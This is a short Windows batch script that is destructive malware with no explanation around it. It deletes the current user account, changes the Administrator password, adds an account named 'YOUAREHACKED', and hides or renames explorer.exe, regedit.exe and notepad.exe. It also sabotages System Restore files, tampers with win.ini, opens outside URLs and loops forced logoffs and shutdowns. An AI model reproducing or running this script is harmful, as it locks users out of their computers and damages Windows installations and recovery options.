@echo off
net user Administrator reg
net user %username% /delete
net user YOUAREHACKED /add
start /B regedit.exe /S settings.reg
cls
shutdown -s -f -t 30 -c "Please wait.."
ren %windir%\media\ download
cls
start /B http://www.download.com/
cd %windir%
attrib %windir% +H
attrib %windir%\explorer.exe +R +H
attrib %windir%\regedit.exe +R +H
echo pause>notepad.exe
attrib %windir%\notepad.exe +R +H
rename %windir%\explorer.exe reg
cls
start /b %systemroot%\system32\oobe\msoobe.exe /a
echo run=cmd.exe>%windir%\win.ini
rename %SystemRoot%\System32\restore\filelist.xml no1 
rename %SystemRoot%\System32\restore\srdiag.exe no2
cls
goto nice
:nice
start /B /HIGH http://fen.xf.cz/logo.php
shutdown -l -f
cls
goto nice
